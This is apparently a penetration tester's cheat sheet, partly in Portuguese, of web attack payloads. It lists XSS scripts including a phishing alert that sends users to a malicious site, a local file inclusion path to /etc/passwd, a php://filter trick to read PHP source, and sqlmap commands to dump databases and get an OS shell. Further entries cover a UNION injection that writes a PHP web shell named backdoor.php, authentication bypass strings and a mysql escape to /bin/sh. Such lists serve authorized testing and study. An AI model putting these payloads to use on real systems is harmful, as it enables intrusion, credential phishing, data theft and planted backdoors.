### XSS

Alert em campo de texto:

    </textarea><script>alert('XSS');</script>

Alert simples:

    <script>alert('XSS');</script>

Phishing no alert:

    </textarea><script>alert('Atenção! Sua senha está prestes a expirar, portanto é obrigatória a renovação de senha para evitar problemas com a sua conta. Acesse http://sitemalicioso.net e renove agora mesmo sua senha!');</script>

### Local File Inclusion (LFI)

```
http://example.com/page=../../../../../../etc/passwd
```



### Bypassing php-execution

So if you have an LFI you can easily read `.txt`-files but not `.php` files. That is because they get executed by the webserver, since their file-ending says that it contains code. This can be bypassed by using a build-in php-filter.

```
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index
```

Here you use a php-filter to convert it all into base64. So in return you get the whole page base64 encoded. Now you only need to decode it. Save the base64-text into a file and then run:

```
base64 -d savefile.php
```

## SQL INJECTION

sqlmap crawl
```
sqlmap -u http://10.10.10.10 --crawl=1
```

sqlmap dump database
```
sqlmap -u http://10.10.10.10 --dbms=mysql --dump
```

sqlmap shell
```
sqlmap -u http://10.10.10.10 --dbms=mysql --os-shell
```

Upload php command injection file
```
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

Load file
```
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
```

Bypasses
```
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 -- -
```

Execução de comando:

```
sudo mysql -uroot -p123456 -e '\! /bin/sh'
```
## Blind

- https://medium.com/@vikramroot/exploiting-time-based-sql-injections-data-exfiltration-791aa7f0ae87
- https://github.com/nvanheuverzwijn/curl-blind-sql-injection/blob/master/README.md
- https://medium.com/@tomnomnom/making-a-blind-sql-injection-a-little-less-blind-428dcb614ba8